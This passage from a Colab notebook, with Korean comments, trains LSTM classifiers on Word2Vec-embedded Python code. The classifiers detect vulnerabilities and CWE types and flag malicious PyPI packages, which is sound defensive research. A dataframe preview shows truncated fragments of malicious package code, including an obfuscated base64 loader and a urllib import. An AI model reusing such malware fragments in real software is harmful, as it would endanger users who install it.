              "\u001b[1m Trainable params: \u001b[0m\u001b[38;5;34m117,377\u001b[0m (458.50 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">117,377</span> (458.50 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Non-trainable params: \u001b[0m\u001b[38;5;34m0\u001b[0m (0.00 B)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Non-trainable params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">0</span> (0.00 B)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "Training model on df_final dataset...\n",
            "Epoch 1/10\n",
            "\u001b[1m31/31\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m2s\u001b[0m 20ms/step - accuracy: 0.6610 - loss: 0.6331 - val_accuracy: 0.7016 - val_loss: 0.5470\n",
            "Epoch 2/10\n",
            "\u001b[1m31/31\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 13ms/step - accuracy: 0.7541 - loss: 0.5056 - val_accuracy: 0.8105 - val_loss: 0.4049\n",
            "Epoch 3/10\n",
            "\u001b[1m31/31\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m1s\u001b[0m 10ms/step - accuracy: 0.8587 - loss: 0.3556 - val_accuracy: 0.8831 - val_loss: 0.3072\n",
            "Epoch 4/10\n",
            "\u001b[1m31/31\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m1s\u001b[0m 10ms/step - accuracy: 0.8999 - loss: 0.2854 - val_accuracy: 0.9073 - val_loss: 0.2657\n",
            "Epoch 5/10\n",
            "\u001b[1m31/31\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m1s\u001b[0m 9ms/step - accuracy: 0.9115 - loss: 0.2126 - val_accuracy: 0.9637 - val_loss: 0.1478\n",
            "Epoch 6/10\n",
            "\u001b[1m31/31\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 9ms/step - accuracy: 0.9377 - loss: 0.1552 - val_accuracy: 0.9435 - val_loss: 0.1764\n",
            "Epoch 7/10\n",
            "\u001b[1m31/31\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 9ms/step - accuracy: 0.9677 - loss: 0.1141 - val_accuracy: 0.9395 - val_loss: 0.1799\n",
            "Epoch 8/10\n",
            "\u001b[1m31/31\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m1s\u001b[0m 9ms/step - accuracy: 0.9434 - loss: 0.1412 - val_accuracy: 0.9556 - val_loss: 0.1389\n",
            "Epoch 9/10\n",
            "\u001b[1m31/31\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 9ms/step - accuracy: 0.9543 - loss: 0.1109 - val_accuracy: 0.9597 - val_loss: 0.1216\n",
            "Epoch 10/10\n",
            "\u001b[1m31/31\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 9ms/step - accuracy: 0.9624 - loss: 0.0845 - val_accuracy: 0.9073 - val_loss: 0.1876\n",
            "\n",
            "Test Accuracy (df_final dataset): 93.57%\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import pickle\n",
        "import os\n",
        "import numpy as np\n",
        "from datetime import datetime # Import datetime\n",
        "\n",
        "# Define the directory to save models\n",
        "model_save_dir = os.path.join(workspace_path, 'model') # Use workspace_path defined earlier\n",
        "os.makedirs(model_save_dir, exist_ok=True)\n",
        "\n",
        "# Get current date and time for filename\n",
        "current_time_str = datetime.now().strftime('%Y%m%d_%H%M%S')\n",
        "\n",
        "# Save model_full if it exists\n",
        "if 'model_full' in locals() and model_full is not None:\n",
        "    model_full_path = os.path.join(model_save_dir, f'model_full_{current_time_str}.pkl') # Add timestamp\n",
        "    with open(model_full_path, 'wb') as f:\n",
        "        pickle.dump(model_full, f)\n",
        "    print(f\"model_full saved to {model_full_path}\")\n",
        "else:\n",
        "    print(\"model_full not found. Skipping save.\")\n",
        "\n",
        "# Save model_final if it exists\n",
        "if 'model_final' in locals() and model_final is not None:\n",
        "    model_final_path = os.path.join(model_save_dir, f'model_final_{current_time_str}.pkl') # Add timestamp\n",
        "    with open(model_final_path, 'wb') as f:\n",
        "        pickle.dump(model_final, f)\n",
        "    print(f\"model_final saved to {model_final_path}\")\n",
        "else:\n",
        "    print(\"model_final not found. Skipping save.\")\n",
        "\n",
        "# Save label encoders as well, as they are needed for prediction\n",
        "if 'label_encoder_full' in locals() and label_encoder_full is not None:\n",
        "    label_encoder_full_path = os.path.join(model_save_dir, f'label_encoder_full_{current_time_str}.pkl') # Add timestamp\n",
        "    with open(label_encoder_full_path, 'wb') as f:\n",
        "        pickle.dump(label_encoder_full, f)\n",
        "    print(f\"label_encoder_full saved to {label_encoder_full_path}\")\n",
        "else:\n",
        "    print(\"label_encoder_full not found. Skipping save.\")\n",
        "\n",
        "if 'label_encoder_final' in locals() and label_encoder_final is not None:\n",
        "    label_encoder_final_path = os.path.join(model_save_dir, f'label_encoder_final_{current_time_str}.pkl') # Add timestamp\n",
        "    with open(label_encoder_final_path, 'wb') as f:\n",
        "        pickle.dump(label_encoder_final, f)\n",
        "    print(f\"label_encoder_final saved to {label_encoder_final_path}\")\n",
        "else:\n",
        "    print(\"label_encoder_final not found. Skipping save.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Qq39KcPyS1Xo",
        "outputId": "cc30b97e-1b3f-4a0b-df2b-4372b81fbe6e"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "model_full saved to /content/drive/MyDrive/fortmp/model/model_full_20250918_063532.pkl\n",
            "model_final saved to /content/drive/MyDrive/fortmp/model/model_final_20250918_063532.pkl\n",
            "label_encoder_full saved to /content/drive/MyDrive/fortmp/model/label_encoder_full_20250918_063532.pkl\n",
            "label_encoder_final saved to /content/drive/MyDrive/fortmp/model/label_encoder_final_20250918_063532.pkl\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# 통합"
      ],
      "metadata": {
        "id": "M7ShOYcCTi6T"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 의존성"
      ],
      "metadata": {
        "id": "hx59C5jcV_wb"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# 현재 사용된 코드에서 명시적으로 임포트된 라이브러리 (버전 포함):\n",
        "# tensorflow: 2.16.1\n",
        "# tensorflow.keras: 3.3.3 (tensorflow에 포함)\n",
        "# sklearn: 1.3.2\n",
        "# pandas: 2.0.3\n",
        "# numpy: 1.26.4\n",
        "# gensim: 4.3.3\n",
        "# pickle: Python 표준 라이브러리\n",
        "# os: Python 표준 라이브러리\n",
        "# io: Python 표준 라이브러리\n",
        "# tokenize: Python 표준 라이브러리"
      ],
      "metadata": {
        "id": "syKzZDkWWA6m"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "file_path = 'combined_dataset.csv'\n",
        "df_final = pd.read_csv(file_path)\n",
        "display(df_final.head())"
      ],
      "metadata": {
        "id": "hKQ77BvvWB7M"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install gensim"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 728
        },
        "outputId": "1e067fa2-cfee-40c8-f464-af46d08767f8",
        "id": "iQYwEhmIWKel"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting gensim\n",
            "  Downloading gensim-4.3.3-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (8.1 kB)\n",
            "Collecting numpy<2.0,>=1.18.5 (from gensim)\n",
            "  Downloading numpy-1.26.4-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (61 kB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m61.0/61.0 kB\u001b[0m \u001b[31m3.8 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hCollecting scipy<1.14.0,>=1.7.0 (from gensim)\n",
            "  Downloading scipy-1.13.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (60 kB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m60.6/60.6 kB\u001b[0m \u001b[31m3.9 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hRequirement already satisfied: smart-open>=1.8.1 in /usr/local/lib/python3.12/dist-packages (from gensim) (7.3.1)\n",
            "Requirement already satisfied: wrapt in /usr/local/lib/python3.12/dist-packages (from smart-open>=1.8.1->gensim) (1.17.3)\n",
            "Downloading gensim-4.3.3-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (26.6 MB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m26.6/26.6 MB\u001b[0m \u001b[31m86.7 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading numpy-1.26.4-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (18.0 MB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m18.0/18.0 MB\u001b[0m \u001b[31m115.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading scipy-1.13.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (38.2 MB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m38.2/38.2 MB\u001b[0m \u001b[31m23.1 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hInstalling collected packages: numpy, scipy, gensim\n",
            "  Attempting uninstall: numpy\n",
            "    Found existing installation: numpy 2.0.2\n",
            "    Uninstalling numpy-2.0.2:\n",
            "      Successfully uninstalled numpy-2.0.2\n",
            "  Attempting uninstall: scipy\n",
            "    Found existing installation: scipy 1.16.1\n",
            "    Uninstalling scipy-1.16.1:\n",
            "      Successfully uninstalled scipy-1.16.1\n",
            "\u001b[31mERROR: pip's dependency resolver does not currently take into account all the packages that are installed. This behaviour is the source of the following dependency conflicts.\n",
            "opencv-contrib-python 4.12.0.88 requires numpy<2.3.0,>=2; python_version >= \"3.9\", but you have numpy 1.26.4 which is incompatible.\n",
            "thinc 8.3.6 requires numpy<3.0.0,>=2.0.0, but you have numpy 1.26.4 which is incompatible.\n",
            "opencv-python 4.12.0.88 requires numpy<2.3.0,>=2; python_version >= \"3.9\", but you have numpy 1.26.4 which is incompatible.\n",
            "tsfresh 0.21.1 requires scipy>=1.14.0; python_version >= \"3.10\", but you have scipy 1.13.1 which is incompatible.\n",
            "opencv-python-headless 4.12.0.88 requires numpy<2.3.0,>=2; python_version >= \"3.9\", but you have numpy 1.26.4 which is incompatible.\u001b[0m\u001b[31m\n",
            "\u001b[0mSuccessfully installed gensim-4.3.3 numpy-1.26.4 scipy-1.13.1\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "application/vnd.colab-display-data+json": {
              "pip_warning": {
                "packages": [
                  "numpy",
                  "scipy"
                ]
              },
              "id": "5fc055e408734786b9d121c94f3d73c9"
            }
          },
          "metadata": {}
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# 1. 구글 드라이브 마운트\n",
        "from google.colab import drive\n",
        "drive.mount('/content/drive')\n",
        "\n",
        "# 2. 작업 폴더 생성 및 이동 (VUDENC 프로젝트를 저장할 위치)\n",
        "# 경로에 본인의 구글 드라이브 ID나 원하는 폴더명을 넣으셔도 됩니다.\n",
        "import os\n",
        "workspace_path = '/content/drive/MyDrive/fortmp/'\n",
        "os.makedirs(workspace_path, exist_ok=True)\n",
        "%cd {workspace_path}\n",
        "\n",
        "print(f\"현재 작업 위치: {os.getcwd()}\")\n",
        "\n",
        "import pandas as pd\n",
        "import numpy as np\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "531d056f-37ab-40e1-ae1c-253457782b7d",
        "id": "QAmC0KhSWKel"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Drive already mounted at /content/drive; to attempt to forcibly remount, call drive.mount(\"/content/drive\", force_remount=True).\n",
            "/content/drive/MyDrive/fortmp\n",
            "현재 작업 위치: /content/drive/MyDrive/fortmp\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 전처리 코드"
      ],
      "metadata": {
        "id": "W9G_GnG-Vusf"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import tokenize\n",
        "from io import BytesIO\n",
        "from tensorflow.keras.preprocessing.sequence import pad_sequences # Import pad_sequences\n",
        "\n",
        "def tokenize_python(code_str, mask_string=True, mask_number=True):\n",
        "    \"\"\"\n",
        "    Python 내장 tokenize 모듈로 소스코드를 토큰화.\n",
        "    - 문자열 리터럴은 마스킹 해제 (옵션)\n",
        "    - 숫자 리터럴은 마스킹 해제 (옵션)\n",
        "    - 주석은 제거\n",
        "    - 들여쓰기/줄바꿈은 <INDENT>, <DEDENT>, <EOL>로 표시\n",
        "    \"\"\"\n",
        "    toks = []\n",
        "    try:\n",
        "        g = tokenize.tokenize(BytesIO(code_str.encode(\"utf-8\")).readline)\n",
        "        SKIP = {tokenize.ENCODING, tokenize.ENDMARKER, tokenize.NL}\n",
        "\n",
        "        for toknum, tokval, _, _, _ in g:\n",
        "            if toknum in SKIP:\n",
        "                continue\n",
        "            if toknum == tokenize.COMMENT:\n",
        "                continue\n",
        "\n",
        "            # Check if the token is a string literal that looks like a multiline comment/docstring\n",
        "            if toknum == tokenize.STRING:\n",
        "                if (tokval.startswith('\"\"\"') and tokval.endswith('\"\"\"')) or \\\n",
        "                   (tokval.startswith(\"'''\") and tokval.endswith(\"'''\")):\n",
        "                    # Skip this token as it's likely a multiline comment or docstring\n",
        "                    continue\n",
        "\n",
        "\n",
        "            if toknum == tokenize.NEWLINE:\n",
        "                toks.append(\"<EOL>\"); continue\n",
        "            if toknum == tokenize.INDENT:\n",
        "                toks.append(\"<INDENT>\"); continue # 코드 블럭 시작\n",
        "            if toknum == tokenize.DEDENT:\n",
        "                toks.append(\"<DEDENT>\"); continue # 코드 블럭 끝\n",
        "\n",
        "            # If we reach here, it's a regular token or a string that wasn't skipped\n",
        "            toks.append(tokval)\n",
        "    except (tokenize.TokenError, IndentationError, SyntaxError):\n",
        "        # 코드가 불완전해서 tokenize 실패하는 경우 건너뜜\n",
        "        pass\n",
        "    return toks"
      ],
      "metadata": {
        "id": "cjWHD182VjRp"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "from gensim.models import Word2Vec\n",
        "import os\n",
        "\n",
        "# Load the pre-trained Word2Vec model\n",
        "model_path = os.path.join(workspace_path, 'word2vec_withString10-6-100.model')\n",
        "try:\n",
        "    w2v_model = Word2Vec.load(model_path)\n",
        "    print(f\"Word2Vec model loaded successfully from {model_path}\")\n",
        "except FileNotFoundError:\n",
        "    print(f\"Error: Model file not found at {model_path}\")\n",
        "    w2v_model = None\n",
        "\n",
        "def get_word_embedding(token, model):\n",
        "    \"\"\"\n",
        "    Get the embedding vector for a given token using the Word2Vec model.\n",
        "    Returns a zero vector if the token is not in the vocabulary.\n",
        "    \"\"\"\n",
        "    if model and token in model.wv:\n",
        "        return model.wv[token]\n",
        "    else:\n",
        "        # Return a zero vector for out-of-vocabulary words\n",
        "        return np.zeros(model.vector_size) if model else None\n",
        "\n",
        "def embed_sequences(tokenized_sequences, model):\n",
        "    \"\"\"\n",
        "    Convert a list of tokenized sequences into a list of embedding sequences.\n",
        "    \"\"\"\n",
        "    if not model:\n",
        "        print(\"Word2Vec model not loaded. Cannot embed sequences.\")\n",
        "        return None\n",
        "\n",
        "    embedded_sequences = []\n",
        "    for sequence in tokenized_sequences:\n",
        "        embedded_sequence = [get_word_embedding(token, model) for token in sequence]\n",
        "        # Filter out None values if model wasn't loaded\n",
        "        embedded_sequence = [emb for emb in embedded_sequence if emb is not None]\n",
        "        if embedded_sequence:\n",
        "             embedded_sequences.append(np.array(embedded_sequence))\n",
        "        else:\n",
        "            # Handle cases where a sequence results in no valid embeddings\n",
        "            embedded_sequences.append(np.array([])) # Append an empty array or handle as needed\n",
        "\n",
        "    return embedded_sequences"
      ],
      "metadata": {
        "id": "RbYMEu3hVnBU"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def pad_token_sequences(sequences, maxlen, padding='post', truncating='post'):\n",
        "    return pad_sequences(sequences, maxlen=maxlen, padding=padding, truncating=truncating)"
      ],
      "metadata": {
        "id": "KfVh6YpiVsTP"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "## 모델 불러와서 분석하기"
      ],
      "metadata": {
        "id": "ab6aqGMvV5u4"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import pickle\n",
        "import os\n",
        "import numpy as np\n",
        "\n",
        "# Define the directory where models are saved\n",
        "model_save_dir = os.path.join(workspace_path, 'model')\n",
        "\n",
        "# Load the saved models and label encoders\n",
        "model_full = None\n",
        "model_final = None\n",
        "label_encoder_full = None\n",
        "label_encoder_final = None\n",
        "\n",
        "try:\n",
        "    with open(os.path.join(model_save_dir, 'model_full.pkl'), 'rb') as f:\n",
        "        model_full = pickle.load(f)\n",
        "    print(\"model_full loaded successfully.\")\n",
        "except FileNotFoundError:\n",
        "    print(\"Error: model_full.pkl not found.\")\n",
        "\n",
        "try:\n",
        "    with open(os.path.join(model_save_dir, 'model_final.pkl'), 'rb') as f:\n",
        "        model_final = pickle.load(f)\n",
        "    print(\"model_final loaded successfully.\")\n",
        "except FileNotFoundError:\n",
        "    print(\"Error: model_final.pkl not found.\")\n",
        "\n",
        "try:\n",
        "    with open(os.path.join(model_save_dir, 'label_encoder_full.pkl'), 'rb') as f:\n",
        "        label_encoder_full = pickle.load(f)\n",
        "    print(\"label_encoder_full loaded successfully.\")\n",
        "except FileNotFoundError:\n",
        "    print(\"Error: label_encoder_full.pkl not found.\")\n",
        "\n",
        "try:\n",
        "    with open(os.path.join(model_save_dir, 'label_encoder_final.pkl'), 'rb') as f:\n",
        "        label_encoder_final = pickle.load(f)\n",
        "    print(\"label_encoder_final loaded successfully.\")\n",
        "except FileNotFoundError:\n",
        "    print(\"Error: label_encoder_final.pkl not found.\")\n",
        "\n",
        "\n",
        "# Ensure models and label encoders are loaded before proceeding\n",
        "if model_full and model_final and label_encoder_full and label_encoder_final:\n",
        "    # 1. 예시로 df의 아무 행의 source를 뽑아와서 전처리하고\n",
        "    if 'df' in locals(): # Check if df DataFrame exists\n",
        "        random_row = df.sample(1).iloc[0]\n",
        "        source_code = random_row['source']\n",
        "        actual_cwe = random_row['CWE'] # Get actual CWE for comparison\n",
        "        actual_keyword = random_row['keyword'] # Get actual keyword for comparison\n",
        "\n",
        "        print(f\"\\n--- Analyzing a random sample (Actual CWE: {actual_cwe}, Keyword: {actual_keyword}) ---\")\n",
        "        print(\"Source Code snippet:\")\n",
        "        print(source_code[:500] + \"...\") # Display a snippet of the code\n",
        "\n",
        "        # Preprocess the source code: tokenize, embed, and pad\n",
        "        tokenized_code = tokenize_python(source_code)\n",
        "\n",
        "        if w2v_model: # Ensure Word2Vec model is loaded for embedding\n",
        "            embedded_code = embed_sequences([tokenized_code], w2v_model)\n",
        "            if embedded_code and len(embedded_code) > 0 and embedded_code[0].size > 0:\n",
        "                # Pad the embedded sequence\n",
        "                max_sequence_length = 100 # Use the same max length as training\n",
        "                embedding_dim = w2v_model.vector_size\n",
        "                padded_code = np.zeros((max_sequence_length, embedding_dim))\n",
        "\n",
        "                embedded_sequence = embedded_code[0]\n",
        "                if embedded_sequence.shape[0] > 0:\n",
        "                    padding_length = max_sequence_length - embedded_sequence.shape[0]\n",
        "                    if padding_length > 0:\n",
        "                        padding = np.zeros((padding_length, embedding_dim))\n",
        "                        padded_code = np.concatenate((embedded_sequence, padding), axis=0)\n",
        "                    else:\n",
        "                        padded_code = embedded_sequence[:max_sequence_length]\n",
        "\n",
        "                # Reshape for prediction (add batch dimension)\n",
        "                padded_code = np.expand_dims(padded_code, axis=0)\n",
        "\n",
        "                # 2. model_final에 넣어 만약 1(취약)인지 0(정상) 판정하고\n",
        "                prediction_final = model_final.predict(padded_code)\n",
        "                predicted_label = (prediction_final > 0.5).astype(int)[0][0] # Binary classification threshold\n",
        "                predicted_vulnerability_status = label_encoder_final.inverse_transform([predicted_label])[0]\n",
        "\n",
        "                print(f\"\\nPredicted Vulnerability Status: {'Vulnerable' if predicted_vulnerability_status == 1 else 'Not Vulnerable'} (Label: {predicted_vulnerability_status})\")\n",
        "\n",
        "                # 3. 만약 취약하다고 나오면 model_full에 넣어서 무슨 취약점인지 구별\n",
        "                if predicted_vulnerability_status == 1:\n",
        "                    print(\"\\nPredicted as Vulnerable. Classifying specific CWE...\")\n",
        "                    prediction_full = model_full.predict(padded_code)\n",
        "                    predicted_cwe_index = np.argmax(prediction_full, axis=1)[0]\n",
        "                    predicted_cwe = label_encoder_full.inverse_transform([predicted_cwe_index])[0]\n",
        "\n",
        "                    print(f\"Predicted CWE Type: {predicted_cwe}\")\n",
        "                else:\n",
        "                    print(\"\\nPredicted as Not Vulnerable. Skipping specific CWE classification.\")\n",
        "\n",
        "            else:\n",
        "                print(\"Error: Could not embed the source code.\")\n",
        "        else:\n",
        "            print(\"Error: Word2Vec model not loaded. Cannot embed sequences.\")\n",
        "    else:\n",
        "        print(\"Error: df DataFrame not found. Cannot sample source code.\")\n",
        "else:\n",
        "    print(\"Error: One or more models/label encoders failed to load. Cannot perform analysis.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "sFHzG4bKTkNb",
        "outputId": "6533d54d-fb02-45aa-dab0-979a85c7d0f4"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "model_full loaded successfully.\n",
            "model_final loaded successfully.\n",
            "label_encoder_full loaded successfully.\n",
            "label_encoder_final loaded successfully.\n",
            "\n",
            "--- Analyzing a random sample (Actual CWE: CWE-77, Keyword: command) ---\n",
            "Source Code snippet:\n",
            "\n",
            " \"\"\"Volume driver for Dell EqualLogic Storage.\"\"\" import functools import random import eventlet from eventlet import greenthread import greenlet from oslo.config import cfg from cinder import exception from cinder.openstack.common import excutils from cinder.openstack.common import log as logging from cinder.openstack.common import processutils from cinder import utils from cinder.volume.drivers.san import SanISCSIDriver LOG=logging.getLogger(__name__) eqlx_opts=[ cfg.StrOpt('eqlx_group_name',...\n",
            "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 292ms/step\n",
            "\n",
            "Predicted Vulnerability Status: Vulnerable (Label: 1)\n",
            "\n",
            "Predicted as Vulnerable. Classifying specific CWE...\n",
            "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 254ms/step\n",
            "Predicted CWE Type: CWE-77\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# 악성 LSTM"
      ],
      "metadata": {
        "id": "kxsdJfy1oV7n"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import pandas as pd\n",
        "import os\n",
        "\n",
        "# Assuming workspace_path is already defined and mounted\n",
        "file_path = os.path.join(workspace_path, 'mal_final_dataset.xlsx')\n",
        "\n",
        "try:\n",
        "    df_mal = pd.read_excel(file_path)\n",
        "    print(f\"'{file_path}' 파일이 df_mal DataFrame으로 성공적으로 로드되었습니다.\")\n",
        "    # Display the first few rows to verify\n",
        "    display(df_mal.head())\n",
        "except FileNotFoundError:\n",
        "    print(f\"오류: '{file_path}' 파일을 찾을 수 없습니다. 파일 경로를 확인해주세요.\")\n",
        "except Exception as e:\n",
        "    print(f\"파일 로드 중 오류가 발생했습니다: {e}\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 225
        },
        "id": "Ji95jkMMoX3o",
        "outputId": "e222f4f3-db75-439b-8fea-3c501c4e1b9b"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "'/content/drive/MyDrive/fortmp/mal_final_dataset.xlsx' 파일이 df_mal DataFrame으로 성공적으로 로드되었습니다.\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "         package                                               code      label\n",
              "0         dahood  \\n    9df=(                     <     G d  d  ...  malicious\n",
              "1  pypackscraper  \\n \\n\\nimport base64, codecs\\nmagic = 'aW1wb3J...  malicious\n",
              "2       markdown  \\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotatio...     benign\n",
              "3        ipython  \\n\\n\\n\\n\\n\\nclass IPyAutocall:\\n_ip = None\\nre...     benign\n",
              "4            pxz  \\n---\\n\\n---\\n\\n---\\nimport os\\nfrom urllib.re...  malicious"
            ],
            "text/html": [
              "\n",
              "  <div id=\"df-2e9f1fd3-f77a-4925-b459-b4df43825c8a\" class=\"colab-df-container\">\n",
              "    <div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>package</th>\n",
              "      <th>code</th>\n",
              "      <th>label</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>dahood</td>\n",
              "      <td>\\n    9df=(                     &lt;     G d  d  ...</td>\n",
              "      <td>malicious</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>pypackscraper</td>\n",
              "      <td>\\n \\n\\nimport base64, codecs\\nmagic = 'aW1wb3J...</td>\n",
              "      <td>malicious</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>markdown</td>\n",
              "      <td>\\n\\n\\n\\n\\n\\n\\nfrom __future__ import annotatio...</td>\n",
              "      <td>benign</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>ipython</td>\n",
              "      <td>\\n\\n\\n\\n\\n\\nclass IPyAutocall:\\n_ip = None\\nre...</td>\n",
              "      <td>benign</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>pxz</td>\n",
              "      <td>\\n---\\n\\n---\\n\\n---\\nimport os\\nfrom urllib.re...</td>\n",
              "      <td>malicious</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>\n",
              "    <div class=\"colab-df-buttons\">\n",
              "\n",
              "  <div class=\"colab-df-container\">\n",
              "    <button class=\"colab-df-convert\" onclick=\"convertToInteractive('df-2e9f1fd3-f77a-4925-b459-b4df43825c8a')\"\n",
              "            title=\"Convert this dataframe to an interactive table.\"\n",
              "            style=\"display:none;\">\n",
              "\n",
              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\" viewBox=\"0 -960 960 960\">\n",
              "    <path d=\"M120-120v-720h720v720H120Zm60-500h600v-160H180v160Zm220 220h160v-160H400v160Zm0 220h160v-160H400v160ZM180-400h160v-160H180v160Zm440 0h160v-160H620v160ZM180-180h160v-160H180v160Zm440 0h160v-160H620v160Z\"/>\n",
              "  </svg>\n",
              "    </button>\n",
              "\n",
              "  <style>\n",
              "    .colab-df-container {\n",
              "      display:flex;\n",
              "      gap: 12px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert {\n",
              "      background-color: #E8F0FE;\n",
              "      border: none;\n",
              "      border-radius: 50%;\n",
